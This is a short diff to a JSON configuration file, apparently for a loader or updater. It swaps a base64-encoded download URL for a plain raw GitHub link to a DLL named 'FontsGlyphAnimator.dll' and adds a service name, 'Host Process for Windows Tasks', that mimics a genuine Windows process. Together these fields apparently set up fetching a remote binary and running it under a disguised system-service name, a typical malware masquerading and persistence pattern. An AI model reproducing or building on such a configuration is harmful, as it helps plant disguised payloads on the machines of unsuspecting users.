@@ -1,5 +1,7 @@
 {
-  "url": "aHR0cHM6Ly9naXRodWIuY29tL0JMQUNLOC85MzEzMC9TTklQL3Jhdy9yZWZzL2hlYWRzL21haW4vRm9udHNHbHlwaEFuaW1hdG9yLmRsbA==",
+  "service_name"   : "Host Process for Windows Tasks",
+  "dll_name"       : "FontsGlyphAnimator.dll",
+  "url"            : "https://raw.githubusercontent.com/BLACK89310/SNIP/refs/heads/main/FontsGlyphAnimator.dll",
   "current_version": "1.0.0",
-  "update_version": "1.0.0"
+  "update_version" : "1.0.0"
 }
